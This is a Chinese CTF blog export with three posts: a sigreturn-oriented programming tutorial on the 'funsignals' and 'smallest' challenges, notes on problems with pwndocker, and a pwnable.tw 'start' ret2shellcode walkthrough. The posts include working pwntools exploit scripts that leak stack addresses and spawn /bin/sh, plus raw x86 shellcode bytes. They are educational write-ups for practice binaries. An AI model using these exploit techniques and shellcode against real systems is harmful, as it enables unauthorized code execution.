src=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></p>\n<h2 id=\"3）SROP利用\"><a href=\"#3）SROP利用\" class=\"headerlink\" title=\"3）SROP利用\"></a>3）SROP利用</h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>\n<h3 id=\"funsignal\"><a href=\"#funsignal\" class=\"headerlink\" title=\"funsignal\"></a>funsignal</h3><p>​        题目地址： <a href=\"https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin\">funsignals</a> </p>\n<p>​        打开题目，是手写汇编。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png\" alt=\"截屏2021-11-09 下午3.36.29\"></p>\n<p>​        观察一下。程序分别通过系统调用，调用了<code>sys_read </code>, <code>sys_sigreturn</code>两个函数。</p>\n<p>​        那么很明显，<code>sys_read</code>用来栈溢出，然后 <code>sys_sigreturn</code>作为返回地址。并且flag的地址都已经给出，我们只需要通过<code>sys_write</code>读出flag的值就行。</p>\n<p>​        所以我们需要构造<code>sys_write</code>的调用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rax = constants.SYS_write<span class=\"comment\">#write函数的系统调用号</span></span><br><span class=\"line\">frame.rdi = constants.STDOUT_FILENO<span class=\"comment\">#1</span></span><br><span class=\"line\">frame.rsi = elf.symbols[<span class=\"string\">&#x27;flag&#x27;</span>]<span class=\"comment\">#0x010000023</span></span><br><span class=\"line\">frame.rdx = <span class=\"number\">50</span><span class=\"comment\">#读取的字符数</span></span><br><span class=\"line\">frame.rip = elf.symbols[<span class=\"string\">&#x27;syscall&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用<code>sys_read</code>的时候把东西读进用户栈，然后接着调用 <code>sys_sigreturn</code>让内核将用户栈的东西恢复，就相当于调用了<code>sys_write</code>，从而读出flag的值。</p>\n<p>​        但是这道题将我们需要的任何地址都给出了，甚至也不需要构造<code>sys_sigreturn</code>，我们通过另外一个例子来演示一下如何构造<code>sys_sigreturn</code>并且获得一个shell。</p>\n<h3 id=\"Smallest-Pwn\"><a href=\"#Smallest-Pwn\" class=\"headerlink\" title=\"Smallest Pwn\"></a>Smallest Pwn</h3><p>​        题目：<a href=\"https://buuoj.cn/challenges#360chunqiu2017_smallest\">smallest pwn</a></p>\n<p>​        直接先在IDA中查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class=\"line\">.text:00000000004000B0                 xor     rax, rax</span><br><span class=\"line\">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class=\"line\">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class=\"line\">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class=\"line\">.text:00000000004000BE                 syscall                ; LINUX - sys_read</span><br><span class=\"line\">.text:00000000004000C0                 retn</span><br><span class=\"line\">.text:00000000004000C0 start           endp</span><br><span class=\"line\">.text:00000000004000C0</span><br><span class=\"line\">.text:00000000004000C0 _text           ends</span><br><span class=\"line\">.text:00000000004000C0</span><br><span class=\"line\">.text:00000000004000C0</span><br><span class=\"line\">.text:00000000004000C0                 end start</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ctf-wiki题解\"><a href=\"#ctf-wiki题解\" class=\"headerlink\" title=\"ctf-wiki题解\"></a>ctf-wiki题解</h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>\n<p>​        由于题目只给出了<code>sys_read</code>，但是泄露程序内存我们肯定是需要一个<code>sys_write</code>    的，所以这里有一个trick，就是通过将<code>sys_read</code>的返回值构造成函数的系统调用号。然后调用<code>sys_write</code>以及<code>sys_sigreturn</code>。</p>\n<p>​        那么来看详细的分析</p>\n<p>​        首先需要调用<code>sys_write</code>，系统调用号为4，也就是需要<code>sys_read</code>返回读入四个字符，将rax的值赋为4。</p>\n<p>​        顺便<code>sys_sigreturn</code>的返回值为119。</p>\n<p>​        然后看exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## modify the return addr to start_addr+3</span></span><br><span class=\"line\"><span class=\"comment\">## so that skip the xor rax,rax; then the rax=1</span></span><br><span class=\"line\"><span class=\"comment\">## get stack addr</span></span><br><span class=\"line\">sh.send(<span class=\"string\">&#x27;\\xb3&#x27;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        首先发送三次<code>start_addr</code>，第一次使得程序执行流重新回到start，但是在重新执行时输入<code>\\xb3</code>    ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从<code>0x4000B3</code>开始。(第三个地址的作用会在后面体现)</p>\n<p>​    同时我们读入的<code>\\xb3</code>    ,仅有一个字节，这使得<code>sys_read</code>的返回值为1，存在rax中，程序在这里就相当于执行了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     rax, 1</span><br><span class=\"line\">mov     edx, 400h       ; count</span><br><span class=\"line\">mov     rsi, rsp        ; buf</span><br><span class=\"line\">mov     rdi, rax        ; fd</span><br><span class=\"line\">syscall                ; LINUX - sys_write</span><br></pre></td></tr></table></figure>\n\n<p>所以此时相当于进行了一个系统调用号为1的系统调用,也就是<code>sys_write</code>函数。</p>\n<p>​    并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。</p>\n<p>​    回忆一下，srop的关键是通过<code>sys_sigreturn</code>来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## make the rsp point to stack_addr</span></span><br><span class=\"line\"><span class=\"comment\">## the frame is read(0,stack_addr,0x400)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()<span class=\"comment\">#创建一个SigreturnFrame，没啥好说的</span></span><br><span class=\"line\">sigframe.rax = constants.SYS_read<span class=\"comment\">#确定我们希望调用的函数的系统调用号</span></span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span><span class=\"comment\">#read参数</span></span><br><span class=\"line\">sigframe.rsi = stack_addr<span class=\"comment\">#read参数，在栈上读入</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span><span class=\"comment\">#read参数，读多大</span></span><br><span class=\"line\">sigframe.rsp = stack_addr<span class=\"comment\">#sigframe参数</span></span><br><span class=\"line\">sigframe.rip = syscall_ret<span class=\"comment\">#sigframe参数，这里是syscall+retn的地址</span></span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br></pre></td></tr></table></figure>\n\n<p>​    接着我们开始构造<code>sys_sigreturn</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## set rax=15 and call sigreturn</span></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">7</span><span class=\"comment\">#读入15字节</span></span><br><span class=\"line\">sh.send(sigreturn)<span class=\"comment\">#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15.</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>    ,此时我们已经可以向用户栈中读入任意数据了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\"></span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(frame_payload)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span> - <span class=\"built_in\">len</span>(frame_payload)) * <span class=\"string\">&#x27;\\x00&#x27;</span> + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>\n\n<p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>\n<p>​        所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用<code>sys_write</code>泄露栈地址，通过两次调用<code>sys_sigreturn</code>，第一次执行<code>sys_read</code>，将<code>execute(&quot;/bin/sh&quot;)</code>写入用户栈，第二次调用<code>sys_sigreturn</code>来getshell。</p>\n<h4 id=\"自己的反思\"><a href=\"#自己的反思\" class=\"headerlink\" title=\"自己的反思\"></a>自己的反思</h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>\n<p>​        怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">reread = <span class=\"number\">0x4000b0</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x4000be</span></span><br><span class=\"line\"></span><br><span class=\"line\">rereadaddr = p64(reread)</span><br><span class=\"line\">syscalladdr = p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">context.clear()</span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rax = <span class=\"number\">59</span></span><br><span class=\"line\">frame.rdi = <span class=\"number\">0x7fffffffe4e8</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\"></span><br><span class=\"line\">binsh=<span class=\"string\">&#x27;/bin/sh&#x27;</span> </span><br><span class=\"line\"></span><br><span class=\"line\">playload1 = rereadaddr+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+ <span class=\"built_in\">str</span>(frame)+binsh</span><br><span class=\"line\">p.send(playload1)</span><br><span class=\"line\"></span><br><span class=\"line\">playload2 = syscalladdr+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(playload2)</span><br><span class=\"line\"><span class=\"comment\">#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/</span></span><br></pre></td></tr></table></figure>\n\n<p>​            </p>\n<p>​        可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。</p>\n<p>​        去查了一些资料，发现还是对于<code>SigreturnFrame()</code>的理解不够透彻。    </p>\n<p>​        <code>SigreturnFrame()</code>中有一个非常重要的part：<code>sigframe.rsp</code></p>\n<p>​        我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。</p>\n<p>​        所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过<code>sys_write</code>    ,来回跳转执行流。</p>\n<h2 id=\"4）总结\"><a href=\"#4）总结\" class=\"headerlink\" title=\"4）总结\"></a>4）总结</h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>\n<h2 id=\"5）参考\"><a href=\"#5）参考\" class=\"headerlink\" title=\"5）参考\"></a>5）参考</h2><p>​        </p>\n<p><a href=\"https://blog.csdn.net/qq_29343201/article/details/72627439\">2017 429 ichunqiu ctf smallest(pwn300) writeup</a>        </p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_5\">SROP</a></p>\n","categories":["STACK - SROP"],"tags":["stack"]},{"title":"pwndocker的pwn题体验（下","url":"/2021/11/11/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-tktBaIsz\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"0）\"><a href=\"#0）\" class=\"headerlink\" title=\"0）\"></a>0）</h3><p>​        哈哈，还是连续剧，我也想不到捏。我也不想捏。</p>\n<h3 id=\"1）问题\"><a href=\"#1）问题\" class=\"headerlink\" title=\"1）问题\"></a>1）问题</h3><p>​        pwndocker体验了快一周，目前来说主要问题有这几个：</p>\n<ol>\n<li><p>启动tmux进行调试时机器发热严重，风扇狂转</p>\n</li>\n<li><p>挂载文件夹内文件不同步</p>\n</li>\n<li><p>快照的制作相对麻烦（时间久，步骤多）</p>\n</li>\n<li><p>打开需要输入命令，有点烦。</p>\n<p>​    想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。</p>\n<p>（看我的绝美终端）</p>\n</li>\n</ol>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%884.09.52.png\" alt=\"截屏2021-11-11 上午4.09.52\"></p>\n<p>​        每天在ayanami的注视下打工也会变得快乐（不是打工）</p>\n<p>​        虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。</p>\n<p>​        目前来说我只能应付。</p>\n<h3 id=\"3）解决方案？\"><a href=\"#3）解决方案？\" class=\"headerlink\" title=\"3）解决方案？\"></a>3）解决方案？</h3><h4 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h4><p>​        机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。</p>\n<p>​        2021-11-14更新：这个问题突然就没有了（</p>\n<h4 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h4><p>​        挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。</p>\n<p>​        2021-11-14更新：这个问题突然就没有了（</p>\n<h4 id=\"3\"><a href=\"#3\" class=\"headerlink\" title=\"3\"></a>3</h4><p>​        这个可以整个一件push脚本</p>\n<p>ps：可以直接<code>docker commit -p</code> ，也算生成了快照，并且耗时比较短，就是有一点点没有安全感。</p>\n<h4 id=\"4\"><a href=\"#4\" class=\"headerlink\" title=\"4\"></a>4</h4><p>​        直接写shell脚本，然后放在默认路径下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8B%E5%8D%889.09.46.png\" alt=\"截屏2021-11-11 下午9.09.46\"></p>\n<h4 id=\"5\"><a href=\"#5\" class=\"headerlink\" title=\"5\"></a>5</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class=\"line\">patchelf --set-interpreter /tmp/ld-2.27.so ./<span class=\"built_in\">test</span></span><br><span class=\"line\">LD_PRELOAD=./libc.so.6 ./<span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n\n<p>好东西</p>\n","categories":["MESS"],"tags":["mess"]},{"title":"pwndocker的pwn题体验（上）","url":"/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-wxZcjIAn\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"1）前言\"><a href=\"#1）前言\" class=\"headerlink\" title=\"1）前言\"></a>1）前言</h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>\n<h3 id=\"2）pwndocker启动\"><a href=\"#2）pwndocker启动\" class=\"headerlink\" title=\"2）pwndocker启动\"></a>2）pwndocker启动</h3><p>​        首先是如何build pwndocker的问题。</p>\n<p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>\n<p>​        这里参考一篇博客的做法：<a href=\"https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80\">skysider/pwndocker 正确使用姿势</a>。</p>\n<p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>\n<p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>\n<p>​        然后可以</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d \\</span><br><span class=\"line\">--rm \\</span><br><span class=\"line\">-h <span class=\"variable\">$&#123;ctf_name&#125;</span> \\</span><br><span class=\"line\">--name <span class=\"variable\">$&#123;ctf_name&#125;</span> \\</span><br><span class=\"line\">-v $(<span class=\"built_in\">pwd</span>)/<span class=\"variable\">$&#123;ctf_name&#125;</span>:/ctf/work \\</span><br><span class=\"line\">-p 23947:23947 \\</span><br><span class=\"line\">--cap-add=SYS_PTRACE \\</span><br><span class=\"line\">--privileged \\</span><br><span class=\"line\">pwn</span><br></pre></td></tr></table></figure>\n\n<p>​        运行镜像。</p>\n<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png\" alt=\"截屏2021-11-03 下午5.00.25\"></p>\n<p>​    </p>\n<p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png\" alt=\"截屏2021-11-03 下午10.05.57\"></p>\n<p>​    </p>\n<p>​        关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>\n<p>​        如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png\" alt=\"截屏2021-11-03 下午10.14.12\"></p>\n<p>​        愉快的gdb时间（（</p>\n<p>​        还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>\n<p>​        然后是做题时间。</p>\n<p>​        这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png\" alt=\"截屏2021-11-03 下午11.01.29\"></p>\n<p>​    </p>\n<p>​        ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>\n<p>​        然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>\n<p>​        还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>\n<p>​        但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>\n<p>​        后来重启一次之后就能立即同步到容器中了。好。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png\" alt=\"截屏2021-11-03 下午11.16.05\"></p>\n<p>​        有一点离谱。</p>\n<p>​        虽然但是，我超，pwndokcer真的好用。</p>\n<p>​        鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>\n<p>​        所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>\n<p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>\n<p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">20</span></span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​    摸了一圈，又EOF力。</p>\n<p>​    换了祖传exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;chall.pwnable.tw&quot;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./start&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#shellcode = asm(shellcraft.sh())</span></span><br><span class=\"line\">shellcode = <span class=\"string\">b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">buf_addr = <span class=\"number\">0xffffd284</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x14</span> </span><br><span class=\"line\">payload += p32(<span class=\"number\">0x8048087</span>)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class=\"line\">stack_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">20</span></span><br><span class=\"line\">payload += p32(stack_addr+<span class=\"number\">20</span>)</span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png\" alt=\"截屏2021-11-04 上午9.49.21\">    </p>\n<p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>\n<p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>\n<p>​        在调试的时候又出现了新问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png\" alt=\"截屏2021-11-04 上午10.01.04\">    </p>\n<p>​        搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。</p>\n<p>​        在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。</p>\n<p>​        这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。</p>\n<p>​        虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。</p>\n<p>​        这里留个疑点吧。</p>\n<p>​        还是回到题目本身。也就是无法<code>gdb.attach()</code>的问题。</p>\n<p>​        原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。</p>\n<p>​        我傻了。坑是真的多。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png\" alt=\"截屏2021-11-04 下午5.30.51\"></p>\n<p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>\n<p>​        在修改源码后解决问题，详情可以参考：<a href=\"https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link\">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>\n<p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>\n<p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>\n<p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\"></h3><p>​    </p>\n<p>​    